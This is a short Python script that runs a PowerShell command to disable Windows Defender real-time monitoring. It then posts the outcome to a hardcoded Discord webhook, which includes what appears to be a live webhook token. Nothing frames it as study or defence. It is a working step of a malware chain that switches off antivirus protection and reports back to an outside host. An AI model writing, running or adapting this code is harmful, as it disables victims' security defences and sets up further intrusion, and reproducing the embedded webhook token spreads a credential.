import subprocess
import requests


WEBHOOK_URL = "https://discord.com/api/webhooks/1424020599566766110/_Q_3efoJ6bIZxmjTQ342HeR7-DfFCLZxwWa7O4SZOq5W4wyT5E17i4H6KjA0KxyOhS_J"


command = "Set-MpPreference -DisableRealtimeMonitoring $true"


result = subprocess.run(
    ["powershell", "-Command", command],
    capture_output=True,
    text=True,
    shell=True
)


if result.returncode == 0:
    message = f"Command '{command}' executed:\n{result.stdout}"
else:
    message = f"Command '{command}' failed:\n{result.stderr}"


requests.post(WEBHOOK_URL, json={"content": message})

print("Done!")